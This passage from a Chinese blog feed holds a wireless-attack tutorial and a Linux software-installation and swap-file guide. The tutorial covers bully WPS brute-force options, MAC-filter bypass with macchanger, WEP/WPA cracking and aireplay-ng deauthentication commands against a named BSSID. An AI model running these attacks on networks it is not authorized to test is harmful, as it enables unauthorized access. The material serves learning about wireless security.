seconds. This will cause bully to sleep 7 times during a lockout</span><br><span class="line">period for a total of 301 seconds.</span><br><span class="line"></span><br><span class="line"> -o, --output file</span><br><span class="line"></span><br><span class="line">By default, messages are printed to the standard output. Use this option to send output </span><br><span class="line">to the specified file instead.</span><br><span class="line"></span><br><span class="line"> -p, --pin N</span><br><span class="line"></span><br><span class="line">This is the starting pin number. Use of this option results in a sequential pin search</span><br><span class="line">starting at the given pin. This is typically handled for you automatically, i.e. an</span><br><span class="line">interrupted session will resume after the last pin that was successfully tested. Note</span><br><span class="line">that when less than 7 digits (8 digits if -B is active) are given, zeroes are padded on</span><br><span class="line">the left.</span><br><span class="line"></span><br><span class="line"> -s, --source macaddr</span><br><span class="line"></span><br><span class="line">The source MAC address to embed in packets sent to the AP. Not all wireless cards can be</span><br><span class="line">used to spoof the source MAC address like this, but the option is provided for chipsets</span><br><span class="line">that allow it. When not provided, the wireless interface is probed to retrieve the MAC.</span><br><span class="line"></span><br><span class="line"> -v, --verbosity N</span><br><span class="line"></span><br><span class="line">Verbosity level. 1 is the quietest, displaying only unrecoverable error information. Level</span><br><span class="line">3 displays the most information, and is best used to determine exactly what is happening</span><br><span class="line">during a session.</span><br><span class="line"></span><br><span class="line"> -w, --workdir path</span><br><span class="line"></span><br><span class="line">Working directory, where randomized pins and session files are stored. Session files are</span><br><span class="line">created in this directory based on the BSSID of the access point. Only one set of randomized</span><br><span class="line">pins is created, and is used for all sessions. If you want to regenerate the pin file, simply</span><br><span class="line">delete it from this directory; however incomplete runs that used the deleted file will not</span><br><span class="line">be restartable. The default directory is ~/.bully/</span><br><span class="line"></span><br><span class="line"> -5, --5ghz</span><br><span class="line"></span><br><span class="line">Use 5 GHz (a/n) channels instead of 2.54 GHz (b/g) channels. Untested.</span><br><span class="line"></span><br><span class="line"> -B, --bruteforce</span><br><span class="line"></span><br><span class="line">Bruteforce the WPS pin checksum digit rather than calculating it according to the WPS</span><br><span class="line">specification. Some AP&apos;s use a non-compliant checksum in an attempt to evade attacks from</span><br><span class="line">compliant software. Use of this option can result in a ten-fold increase in the time it</span><br><span class="line">takes to discover the second portion of the pin, and should only be used when necessary.</span><br><span class="line"></span><br><span class="line"> -F, --force</span><br><span class="line"></span><br><span class="line">In certain scenarios bully will print a warning message and exit. This typically indicates that</span><br><span class="line">it is being used in a manner that is questionable for most users. Advanced users and developers</span><br><span class="line">can force continuance with this option.</span><br><span class="line"></span><br><span class="line"> -S, --sequential</span><br><span class="line"></span><br><span class="line">By default, pins are randomized. This options allows pins to be tested sequentially.</span><br><span class="line"></span><br><span class="line"> -T, --test</span><br><span class="line"></span><br><span class="line">Test mode. No packets are injected. Can be used to validate arguments, determine if an</span><br><span class="line">access point is visible and has WPS enabled, generate a randomized pin file, or create a</span><br><span class="line">session file for the access point.</span><br><span class="line"></span><br><span class="line"> -d, --pixiewps</span><br><span class="line"> </span><br><span class="line">           The -d option performs an offline attack, Pixie Dust (pixiewps),</span><br><span class="line">by automatically passing the PKE, PKR, E-Hash1, E-Hash2, E-Nonce and Authkey.</span><br><span class="line">pixiewps will then try to attack Ralink, Broadcom and Realtek chipsets.</span><br><span class="line"></span><br><span class="line"> -g, --genpin N</span><br><span class="line"> </span><br><span class="line">           This is a pin generator for either [1] D-Link or [2] Belkin</span><br><span class="line">routers which uses a known vulnerability names &quot;pingen attack&quot;.</span><br><span class="line"></span><br><span class="line"> -a, --acktime N</span><br><span class="line"></span><br><span class="line">Deprecated. Packet timings are throttled automatically. Will be removed in future revision.</span><br><span class="line"></span><br><span class="line"> -r, --retries N</span><br><span class="line"></span><br><span class="line">How many times do we resend packets when they aren&apos;t acknowledged? Default is 3. The idea is to</span><br><span class="line">make a best effort to ensure the AP receives every packet we send, rather than have transactions</span><br><span class="line">fail and restart due to a missed packet.</span><br><span class="line"></span><br><span class="line"> -m, --m13time N</span><br><span class="line"></span><br><span class="line">Deprecated. Packet timings are throttled automatically. Will be removed in future revision.</span><br><span class="line"></span><br><span class="line"> -t, --timeout N</span><br><span class="line"></span><br><span class="line">Deprecated. Packet timings are throttled automatically. Will be removed in future revision.</span><br><span class="line"></span><br><span class="line"> -1, --pin1delay M[,N]</span><br><span class="line"></span><br><span class="line">Delay M seconds for every Nth NACK at M5. The default is 0,1 (no delay). Some access points</span><br><span class="line">get overwhelmed by too many successive WPS transactions, and can even crash if we don&apos;t dial</span><br><span class="line">things back a bit. This is the delay period to use during the first half of the pin.</span><br><span class="line"></span><br><span class="line"> -2, --pin2delay M[,N]</span><br><span class="line"></span><br><span class="line">Delay M seconds for every Nth NACK at M7. The default is 0,1 (no delay). Some access points</span><br><span class="line">handle transactions through M4 easily, only to fall down on too many successive M6 messages.</span><br><span class="line">This is the delay period to use during the second half of the pin.</span><br><span class="line"></span><br><span class="line"> -A, --noacks</span><br><span class="line"></span><br><span class="line">Turn off acknowledgement processing for all sent packets. Useful if you are sure the AP is</span><br><span class="line">receiving packets even though bully can&apos;t see acknowledgements. You might need this for a USB</span><br><span class="line">wifi adapter that processes acknowledgements and drops them before libpcap ever sees them.</span><br><span class="line"></span><br><span class="line"> -C, --nocheck</span><br><span class="line"></span><br><span class="line">Turn off frame check sequence processing. We can improve performance somewhat by making the</span><br><span class="line">dubious assumption that all packets we receive are valid. See also --nofcs below.</span><br><span class="line"></span><br><span class="line"> -D, --detectlock</span><br><span class="line"></span><br><span class="line">Certain access points do not indicate that they have locked WPS in their beacon IE tags, but</span><br><span class="line">summarily ignore all WPS transactions for a period of time. With this option, we can detect the</span><br><span class="line">condition and sleep for --lockdelay seconds before resuming. In the interests of remaining</span><br><span class="line">undetected, there is no point in broadcasting 5 minutes worth of unanswered EAP START messages.</span><br><span class="line"></span><br><span class="line"> -E, --eapfail</span><br><span class="line"></span><br><span class="line">Send EAP FAIL messages after each transaction. Some AP&apos;s get confused when they don&apos;t see this.</span><br><span class="line"></span><br><span class="line"> -L, --lockignore</span><br><span class="line"></span><br><span class="line">Ignore WPS lock conditions reported in beacon information elements (don&apos;t sleep).</span><br><span class="line"></span><br><span class="line"> -M, --m57nack</span><br><span class="line"></span><br><span class="line">Treat M5 and M7 timeouts as NACK&apos;s, for those access points that don&apos;t send them but instead</span><br><span class="line">drop the transaction. When using this option you will probably want to increase the --timeout </span><br><span class="line">value, so that bully doesn&apos;t incorrectly assume a pin is incorrect due to a delayed message.</span><br><span class="line"></span><br><span class="line"> -N, --nofcs</span><br><span class="line"></span><br><span class="line">Some wireless hardware will have done the work of checking and stripping the FCS from packets</span><br><span class="line">already. Bully usually detects this and adjusts accordingly, but the option is here if you need</span><br><span class="line">to force it.</span><br><span class="line"></span><br><span class="line"> -P, --probe</span><br><span class="line"></span><br><span class="line">Bully uses beacons to examine the WPS state of an access point. For nonbeaconing AP&apos;s, send</span><br><span class="line">directed probe requests and use the resulting probe responses instead. Requires --essid.</span><br><span class="line"></span><br><span class="line"> -Q, --wpsinfo</span><br><span class="line"></span><br><span class="line">Gather WPS info by using probe request(s) against a target.</span><br><span class="line">May reveal chipset manufacturer, WPS version and other geeky stats.</span><br><span class="line"></span><br><span class="line"> -R, --radiotap</span><br><span class="line"></span><br><span class="line">Assume radiotap headers are present in received packets. This is useful in cases where presence</span><br><span class="line">of radiotap headers is incorrectly reported or detected.</span><br><span class="line"></span><br><span class="line"> -Z, --suppress</span><br><span class="line"></span><br><span class="line">Suppress automatic timimg algorithm and instead use default timings for received packets. NOT</span><br><span class="line">RECOMMENDED.</span><br><span class="line"></span><br><span class="line"> -W, --windows7</span><br><span class="line"></span><br><span class="line">Masquerade as a Windows 7 registrar.</span><br><span class="line"></span><br><span class="line"> -V, --version</span><br><span class="line"></span><br><span class="line">Print version information to standard output and exit.</span><br><span class="line"></span><br><span class="line"> -h, --help</span><br><span class="line"></span><br><span class="line">Display onscreen help.</span><br></pre></td></tr></table></figure>
<h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><h5 id="MAC地址绑定攻击"><a href="#MAC地址绑定攻击" class="headerlink" title="MAC地址绑定攻击"></a>MAC地址绑定攻击</h5><p>管理员误以为MAC绑定是一种安全机制，能够限制可以关联的客户端MAC地址。<br>准备AP：<br>1、AP基本配置<br>2、Open认证<br>3、开启无线过滤<br>修改MAC地址绕过过滤：<br>别人做了白名单mac绑定，这样的话，侦听这个BSSID，查看哪一个STA的MAC已经连上，复制这个已经连上的STA的MAC，把这个MAC地址复制到自己的无线网卡的MAC上。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ifconfig wlan0 down</span><br><span class="line">macchanger -m 接MAC地址 接网卡</span><br><span class="line">ifconfig wlan0 up</span><br></pre></td></tr></table></figure></p>
<p>再去连接，就可以连接上了。——&gt;双方存在的话会丢包，信号不好（除非只有一个存在）</p>
<h5 id="WEP密码破解原理"><a href="#WEP密码破解原理" class="headerlink" title="WEP密码破解原理"></a>WEP密码破解原理</h5><h6 id="WEP共享密钥破解"><a href="#WEP共享密钥破解" class="headerlink" title="WEP共享密钥破解"></a>WEP共享密钥破解</h6><p>1、IV并非完全随机<br>2、每224个包可能出现一次IV重用<br>3、收集大量IV之后找出相同IV及其对应密文，分析得出共享密码<br>ARP回包中包含IV<br>只要在IV足够多的情况下，任何复杂程度的WEP密码都可以被破解（IV量破解和暴力破解）</p>
<h6 id="FAKE-AUTHENTICATION"><a href="#FAKE-AUTHENTICATION" class="headerlink" title="FAKE AUTHENTICATION"></a>FAKE AUTHENTICATION</h6><p>伪造认证，以便与AP进行正常通信</p>
<h6 id="ARP重放"><a href="#ARP重放" class="headerlink" title="ARP重放"></a>ARP重放</h6><p>侦听正常的ARP包并重放给AP<br>AP回包中包含大量弱IV——&gt;重复出现</p>
<h5 id="WPA攻击"><a href="#WPA攻击" class="headerlink" title="WPA攻击"></a>WPA攻击</h5><h6 id="DEAUTHENTICATION"><a href="#DEAUTHENTICATION" class="headerlink" title="DEAUTHENTICATION"></a>DEAUTHENTICATION</h6><p>强制客户端与AP断开关联<br>重连生成ARP请求，AP回包包含IV<br>WPA重连过程，过程抓取4步握手过程,保存到本地cap文件中。<br>无客户端情况下此攻击无效<br>暴力破解条件：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、CPU资源</span><br><span class="line">2、时间</span><br><span class="line">3、字典质量：</span><br><span class="line">	网上共享的字典</span><br><span class="line">	泄露密码(an Internet)</span><br><span class="line">	地区电话号码段</span><br><span class="line">	Crunch生成字典</span><br><span class="line">	kali中自带的字典 ——&gt;有些密码不符合要求，会自动过滤</span><br></pre></td></tr></table></figure></p>
<h5 id="WPS攻击"><a href="#WPS攻击" class="headerlink" title="WPS攻击"></a>WPS攻击</h5><ul>
<li>WPS是WiFi联盟2006年开发的一项技术<br>  通过PIN码来简化无线接入的操作，无需记住PSK<br>  路由器和网卡各按一个按钮就能接入无线<br>  PIN码是分为前后各4位的2段共8位数字</li>
<li>安全漏洞<br>  2011年被发现安全涉及漏洞<br>  接入发起方可以根据路由器的返回信息判断前4位是否正确<br>  而PIN码的后4位只有1000种定义的组合（最后一位是checksum）<br>  所以全部穷举破解只需要11000次尝试<pre><code>PSK：218340105584896种可能
</code></pre>  标准本身没有设计锁定机制，目前多个厂商已实现锁定机制<br>//都要支持WPS功能，初衷是：物理连接，物理确认（通过按钮  ）。<br>//AP要是支持WPS的话，只要尝试最多11000次找出PIN码，就会被破解。<br>——&gt;因为有限制，所以设置攻击方式、次数等</li>
<li>用计算器直接算出PIN<br>  C83A35、00B00C——&gt;很少见<br>//它直接找出PIN码，最多11000次；找出后计算出key，肯定能算出，不像WPA要字典。</li>
</ul>
<h5 id="小实验"><a href="#小实验" class="headerlink" title="小实验"></a>小实验</h5><p>隐藏SSID防止破解有用么？<br>隐藏SSID就是把你wifi的AP隐藏起来，不让别人搜索到。请注意，这样的话，在连接wifi时就要手动输入AP名。<br><img data-src="https://img-blog.csdnimg.cn/20200324185847312.png" alt="在这里插入图片描述"><br>只看到了 length 12，没有ap名。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 wlan0mon</span><br><span class="line">aireplay-ng -0 30 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon</span><br></pre></td></tr></table></figure></p>
<p>破解密码的方法不变；使用上面两个命令就可以轻松得到ap名。</p>
<p>事实证明，隐藏SSID并不管啥事；其实设置一个复杂的密码比隐藏SSID要管用的多。</p>
<p>本文同步更新至个人博客：<a href="https://xchcloud.cn">罗小黑零食铺</a><br>如果个人博客打不开就是维护升级中～</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>kali</tag>
        <tag>无线安全</tag>
      </tags>
  </entry>
  <entry>
    <title>2019年2月学习笔记</title>
    <url>/2019%E5%B9%B42%E6%9C%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入访问密匙</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>数据分析</tag>
        <tag>Tensorflow</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux经验汇总</title>
    <url>/Linux%E7%BB%8F%E9%AA%8C%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h2 id="linux安装软件和卸载的几种方法"><a href="#linux安装软件和卸载的几种方法" class="headerlink" title="linux安装软件和卸载的几种方法"></a>linux安装软件和卸载的几种方法</h2><h3 id="一、rpm包安装方式步骤："><a href="#一、rpm包安装方式步骤：" class="headerlink" title="一、rpm包安装方式步骤："></a>一、rpm包安装方式步骤：</h3><p>1、找到相应的软件包，比如soft.version.rpm，下载到本机某个目录； </p>
<p>2、打开一个终端，su -成root用户； </p>
<p>3、cd soft.version.rpm所在的目录； </p>
<p>4、输入rpm -ivh soft.version.rpm<br><a id="more"></a></p>
<h4 id="详细介绍："><a href="#详细介绍：" class="headerlink" title="详细介绍："></a>详细介绍：</h4><ol>
<li>安装：<br>　　我只需简单的一句话，就可以说完。执行：<br>　　rpm –ivh rpm的软件包名<br>　    更高级的，请见下表：<br>　　rpm参数 参数说明<br>　　-i 安装软件<br>　　-t 测试安装，不是真的安装<br>　　-p 显示安装进度<br>　　-f 忽略任何错误<br>　　-U 升级安装<br>　　-v 检测套件是否正确安装<br>　　这些参数可以同时采用。更多的内容可以参考RPM的命令帮助。</li>
<li>卸载：<br>　　我同样只需简单的一句话，就可以说完。执行：<br>　　rpm –e 软件名<br>　　不过要注意的是，后面使用的是软件名，而不是软件包名。例如，要安装software-1.2.3-1.i386.rpm这个包时，应执行：<br>　　rpm –ivh software-1.2.3-1.i386.rpm<br>　　而当卸载时，则应执行：<br>　　rpm –e software。<br>另外，在Linux中还提供了象GnoRPM、kpackage等图形化的RPM工具，使得整个过程会更加简单。</li>
</ol>
<h3 id="二、deb包安装方式步骤："><a href="#二、deb包安装方式步骤：" class="headerlink" title="二、deb包安装方式步骤："></a>二、deb包安装方式步骤：</h3><p>1、找到相应的软件包，比如soft.version.deb，下载到本机某个目录； </p>
<p>2、打开一个终端，su -成root用户； </p>
<p>3、cd soft.version.deb所在的目录； </p>
<p>4、输入dpkg -i soft.version.deb</p>
<h4 id="详细介绍：-1"><a href="#详细介绍：-1" class="headerlink" title="详细介绍："></a>详细介绍：</h4><p>这是Debian Linux提供的一个包管理器，它与RPM十分类似。但由于RPM出现得更早，所以在各种版本的Linux都常见到。而debian的包管理器dpkg则只出现在Debina Linux中，其它Linux版本一般都没有。</p>
<ol>
<li>安装<br>　    dpkg –i deb的软件包名<br>　　如：dpkg –i software-1.2.3-1.deb</li>
<li>卸载<br>　　 dpkg –e 软件名<br>　　如：dpkg –e software</li>
<li>查询：查询当前系统安装的软件包：<br> dpkg –l ‘<em>软件包名</em>’<br> 如：dpkg –l ‘<em>software</em>‘</li>
</ol>
<h3 id="三、tar-gz源代码包安装方式："><a href="#三、tar-gz源代码包安装方式：" class="headerlink" title="三、tar.gz源代码包安装方式："></a>三、tar.gz源代码包安装方式：</h3><p>1、找到相应的软件包，比如soft.tar.gz，下载到本机某个目录； </p>
<p>2、打开一个终端，su -成root用户； </p>
<p>3、cd soft.tar.gz所在的目录； </p>
<p>4、tar -xzvf soft.tar.gz //一般会生成一个soft目录 </p>
<p>5、cd soft </p>
<p>6、./configure </p>
<p>7、make </p>
<p>8、make install</p>
<h4 id="1-安装："><a href="#1-安装：" class="headerlink" title="1. 安装："></a>1. 安装：</h4><p>　　整个安装过程可以分为以下几步：<br>　　1） 取得应用软件：通过下载、购买光盘的方法获得；<br>　　2）解压缩文件：一般tar包，都会再做一次压缩，如gzip、bz2等，所以你需要先解压。如果是最常见的gz格式，则可以执行：“tar –xvzf 软件包名”，就可以一步完成解压与解包工作。如果不是，则先用解压软件，再执行“tar –xvf 解压后的tar包”进行解包；<br>　　3） 阅读附带的INSTALL文件、README文件；<br>　　4） 执行“./configure”命令为编译做好准备；<br>　　5） 执行“make”命令进行软件编译；<br>　　6） 执行“make install”完成安装；<br>　　7） 执行“make clean”删除安装时产生的临时文件。<br>　　好了，到此大功告成。我们就可以运行应用程序了。但这时，有的读者就会问，我怎么执行呢？这也是一个Linux特色的问题。其实，一般来说， Linux的应用软件的可执行文件会存放在/usr/local/bin目录下！不过这并不是“放四海皆准”的真理，最可靠的还是看这个软件的 INSTALL和README文件，一般都会有说明。</p>
<h4 id="2-卸载："><a href="#2-卸载：" class="headerlink" title="2. 卸载："></a>2. 卸载：</h4><p>　　通常软件的开发者很少考虑到如何卸载自己的软件，而tar又仅是完成打包的工作，所以并没有提供良好的卸载方法。<br>　　那么是不是说就不能够卸载呢！其实也不是，有两个软件能够解决这个问题，那就是Kinstall和Kife，它们是tar包安装、卸载的黄金搭档。</p>
<h3 id="四、tar-bz2源代码包安装方式："><a href="#四、tar-bz2源代码包安装方式：" class="headerlink" title="四、tar.bz2源代码包安装方式："></a>四、tar.bz2源代码包安装方式：</h3><p>1、找到相应的软件包，比如soft.tar.bz2，下载到本机某个目录； </p>
<p>2、打开一个终端，su -成root用户； </p>
<p>3、cd soft.tar.bz2所在的目录； </p>
<p>4、tar -xjvf soft.tar.bz2 //一般会生成一个soft目录 </p>
<p>5、cd soft </p>
<p>6、./configure </p>
<p>7、make </p>
<p>8、make install </p>
<h3 id="五、apt方式安装：（安装deb包）"><a href="#五、apt方式安装：（安装deb包）" class="headerlink" title="五、apt方式安装：（安装deb包）"></a>五、apt方式安装：（安装deb包）</h3><p>1、打开一个终端，su -成root用户； </p>
<p>2、apt-cache search soft 注：soft是你要找的软件的名称或相关信息 </p>
<p>3、如果2中找到了软件soft.version，则用apt-get install soft.version命令安装软件</p>
<p>注：只要你可以上网，只需要用apt-cache search查找软件，用apt-get install软件<br>详细介绍：</p>
<pre><code>
apt-get是debian，ubuntu发行版的包管理工具，与红帽中的yum工具非常类似。

apt-get命令一般需要root权限执行，所以一般跟着sudo命令例sudo apt-get xxxx
apt-get install packagename——安装一个新软件包（参见下文的aptitude）
apt-get remove packagename——卸载一个已安装的软件包（保留配置文件）
apt-get --purge remove packagename——卸载一个已安装的软件包（删除配置文件）
dpkg --force-all --purge packagename ——有些软件很难卸载，而且还阻止了别的软件的应用，就可以用这个，不过有点冒险。
apt-get autoremove——因为apt会把已装或已卸的软件都备份在硬盘上，所以如果需要空间的话，可以让这个命令来删除你已经删掉的软件。
apt-get autoclean——定期运行这个命令来清除那些已经卸载的软件包的.deb文件。通过这种方式，可以释放大量的磁盘空间。如果需求十分迫切，可以使用apt-get clean以释放更多空间。这个命令会将已安装软件包裹的.deb文件一并删除。
apt-get clean——这个命令会把安装的软件的备份也删除，不过这样不会影响软件的使用的。
apt-get upgrade——更新所有已安装的软件包
apt-get dist-upgrade——将系统升级到新版本
apt-cache search string——在软件包列表中搜索字符串
apt-cache showpkg pkgs——显示软件包信息。
apt-cache stats——查看库里有多少软件
apt-cache dumpavail——打印可用软件包列表。
apt-cache show pkgs——显示软件包记录，类似于dpkg –print-avail。
apt-cache pkgnames——打印软件包列表中所有软件包的名称
（需要定期运行这一命令以确保您的软件包列表是最新的）
简单的说： dpkg只能安装已经下载到本地机器上的deb包. apt-get能在线下载并安装deb包,能更新系统,
且还能自动处理包与包之间的依赖问题,这个是dpkg工具所不具备的。
</code></pre>

<h3 id="六、yum方式安装：-安装rpm包"><a href="#六、yum方式安装：-安装rpm包" class="headerlink" title="六、yum方式安装：(安装rpm包)"></a>六、yum方式安装：(安装rpm包)</h3><p>rpm 是linux的一种软件包名称，以.rmp结尾，安装的时候语法为：rpm -ivh。<br>rpm包的安装有个很大的缺点就是文件的关联性太大，有时装一个软件要安装很多其他的软件包，很麻烦。<br>所以为此RedHat小红帽开发了yum安装方法，他可以彻底解决这个关联性的问题，很方便，只要配置两个文件即可安装，安装方法是：yum -y install 。<br>yum并不是一中包，而是安装包的软件</p>
<p>简单的说： rpm 只能安装已经下载到本地机器上的rpm 包. yum能在线下载并安装rpm包,能更新系统,<br>且还能自动处理包与包之间的依赖问题,这个是rpm 工具所不具备的。</p>
<h3 id="七、bin文件安装："><a href="#七、bin文件安装：" class="headerlink" title="七、bin文件安装："></a>七、bin文件安装：</h3><p>如果你下载到的软件名是soft.bin，一般情况下是个可执行文件，安装方法如下： </p>
<p>1、打开一个终端，su -成root用户； </p>
<p>2、chmod +x soft.bin </p>
<p>3、./soft.bin //运行这个命令就可以安装软件了 </p>
<h3 id="八、不需要安装的软件："><a href="#八、不需要安装的软件：" class="headerlink" title="八、不需要安装的软件："></a>八、不需要安装的软件：</h3><p>有了些软件，比如lumaqq，是不需要安装的，自带jre解压缩后可直接运行。假设 </p>
<p>下载的是lumaqq.tar.gz，使用方法如下： </p>
<p>1、打开一个终端，su -成root用户； </p>
<p>2、tar -xzvf lumaqq.tar.gz //这一步会生成一个叫LumaQQ的目录 </p>
<p>3、cd LumaQQ </p>
<p>4、chmod +x lumaqq //设置lumaqq这个程序文件为可运行 </p>
<p>5、此时就可以运行lumaqq了，用命令./lumaqq即可，但每次运行要输入全路径或 </p>
<p>切换到刚才生成的LumaQQ目录里 </p>
<p>6、为了保证不设置路径就可以用，你可以在/bin目录下建立一个lumaqq的链接， </p>
<p>用命令ln -s lumaqq /bin/ 即可，以后任何时候打开一个终端输入lumaqq就可以 </p>
<p>启动QQ聊天软件了 </p>
<p>7、 如果你要想lumaqq有个菜单项，使用菜单编辑工具，比如Alacarte Menu </p>
<p>Editor，找到上面生成的LumaQQ目录里的lumaqq设置一个菜单项就可以了，当然你 </p>
<p>也可以直接到 /usr/share/applications目录，按照里面其它*.desktop文件的格 </p>
<p>式生成一个自己的desktop文件即可。</p>
<h3 id="PS：软件的安装"><a href="#PS：软件的安装" class="headerlink" title="PS：软件的安装"></a>PS：软件的安装</h3><p><code><pre><br>　　—- Linux下软件的安装主要有两种不同的形式。第一种安装文件名为filename.tar.gz。另一种安装文件名为 filename.i386.rpm。以第一种方式发行的软件多为以源码形式发送的。第二种方式则是直接以二进制形式发行的。i386即表示该软件是按 Inter 386指令集编译生成的。<br>　　—- 对于第一种，安装方法如下：<br>　　—- 首先，将安装文件拷贝至你的目录中。例如，如果你是以root身份登录上的，就将软件拷贝至/root中。<br>　　—- #cp filename.tar.gz /root<br>　　—- 由于该文件是被压缩并打包的，所以，应对其解压缩。命令为：<br>　　—- #tar xvzf filename.tar.gz<br>　　—- 执行该命令后，安装文件按路径，解压缩在当前目录下。用ls命令可以看到解压缩后的文件。通常在解压缩后产生的文件中，有名为”INSTALL”的文件。该文件为纯文本文件，详细讲述了该软件包的安装方法。<br>　　—- 对于多数需要编译的软件，其安装的方法大体相同。执行解压缩后产生的一个名为configure的可执行脚本程序。它是用于检查系统是否有编译时所需的库，以及库的版本是否满足编译的需要等安装所需要的系统信息。为随后的编译工作做准备。命令为：<br>　　—- #./configure<br>　　—- 如果检查过程中，发现有错误，configure将给予提示，并停止检查。你可以跟据提示对系统进行配置。再重新执行该程序。检查通过后，将生成用于编译 的MakeFile文件。此时，可以开始进行编译了。编译的过程视软件的规模和计算机的性能的不同，所耗费的时间也不同。命令为：<br>　　—- #make<br>　　—- 成功编译后，键入如下的命令开始安装：<br>　　—- #make install<br>　　—- 安装完毕，应清除编译过程中产生的临时文件和配置过程中产生的文件。键入如下命令：<br>　　#make clean<br>　　#make distclean<br>　　至此，软件的安装结束。<br>　　—- 对于第二种，其安装方法要简单的多。<br>　　—- 同第一种方式一样，将安装文件拷贝至你的目录中。然后使用rpm来安装该文件。命令如下：<br>　　—- #rpm -i filename.i386.rpm<br>　　—- rpm将自动将安装文件解包，并将软件安装到缺省的目录下。并将软件的安装信息注册到rpm的数据库中。参数i的作用是使rpm进入安装模式。<br>　　—- 另外，还有一些Linux平台下的商业软件。在其安装文件中，有Setup安装程序，其安装方法同Windows平台下的一样。如:Corel WordPerfect。<br>　　软件的卸载<br>　　—- 软件的卸载主要是使用rpm来进行的。卸载软件首先要知道软件包在系统中注册的名称。键入命令：<br>　　—- #rpm -q -a<br>　　—- 即可查询到当前系统中安装的所有的软件包。参数q的作用是使rpm进入查询命令模式。参数a是查询模式的子参数，意为全部（ALL）。查询到的信息较多，可使用less人屏显示。<br>　　—- 确定了要卸载的软件的名称，就可以开始实际卸载该软件了。键入命令：<br>　　—- #rpm -e [package name]<br>　　—- 即可卸载软件。参数e的作用是使rpm进入卸载模式。对名为[package name]的软件包进行卸载。由于系统中各个软件包之间相互有依赖关系。如果因存在依赖关系而不能卸载，rpm将给予提示并停止卸载。你可以使用如下的命 令来忽略依赖关系，直接开始卸载：<br>　　—- #rpm -e [package name] -nodeps<br>　　—- 忽略依赖关系的卸载可能会导致系统中其它的一此软件无法使用。你可以使用<br>　　—- #rpm -e [package name] -test<br>　　—- 使rpm进行一次卸载预演，而不是真正卸载。这样可以使你检查一下软件是否存在有依赖关系。卸载过程中是否有错误。<br></pre></code></p>
<h2 id="交换分区的启用"><a href="#交换分区的启用" class="headerlink" title="交换分区的启用"></a>交换分区的启用</h2><p>编译安装过程，执行make命令时报错：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c++: internal compiler error: Killed (program cc1plus) </span><br><span class="line">Please submit a full bug report, </span><br><span class="line">with preprocessed source if appropriate. </span><br><span class="line">See http://bugzilla.redhat.com/bugzilla for instructions. </span><br><span class="line">make[2]: * [sql/CMakeFiles/sql.dir/item_geofunc.cc.o] Error 4 </span><br><span class="line">make[1]: * [sql/CMakeFiles/sql.dir/all] Error 2 </span><br><span class="line">make: * [all] Error 2</span><br></pre></td></tr></table></figure></p>
<p>原因解析：<br>内存不足，mysql5.9以上的版本，编译安装需要1G内存，而我的云主机刚好1G内存。</p>
<p>解决方案<br>内存不足当然加内存,加内存太贵？那就把硬盘当内存来用把<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$dd if=/dev/zero of=/data/swap_add bs=1M count=2048</span><br><span class="line">$mkswap /data/swap_add</span><br><span class="line">$swapon /data/swap_add</span><br><span class="line">$swapon -s</span><br></pre></td></tr></table></figure></p>
<p>内存不足出错</p>
<p>解决方法：增加swap space 交换空间</p>
<p>1、创建空文件</p>
<p>/media/swapfile.img只是一个实例文件，这个文件你可以自定义创建任意一个空白文件</p>
<p><code>dd if=/dev/zero of=/media/swapfile.img bs=1024 count=1M</code></p>
<p>2、生成文件交换系统</p>
<p><code>mkswap /media/swapfile.img</code><br>3、设置开机启动<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Add this line to /etc/fstab</span><br><span class="line">vim /etc/fstab</span><br><span class="line"></span><br><span class="line">//加入</span><br><span class="line">/media/swapfile.img swap swap sw 0 0</span><br></pre></td></tr></table></figure></p>
<p>4、激活</p>
<p><code>swapon /media/swapfile.img</code><br>5、验证是否成功</p>
<p><code>[root@izwz956snfyrvah6yq8sa4z ~]# cat /proc/swaps</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Filename                                Type            Size    Used    Priority</span><br><span class="line">/media/swapfile.img                     file            1048572 0       -2</span><br></pre></td></tr></table></figure></p>
<p><code>[root@izwz956snfyrvah6yq8sa4z ~]# grep &#39;Swap&#39; /proc/meminfo</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SwapCached:            0 kB</span><br><span class="line">SwapTotal:       1048572 kB</span><br><span class="line">SwapFree:        1048572 kB</span><br></pre></td></tr></table></figure></p>
<p><a href="https://blog.csdn.net/zhangxiaoyang0/article/details/82501209" target="_blank" rel="noopener">Linux上创建SWAP文件/分区</a>  :参考</p>
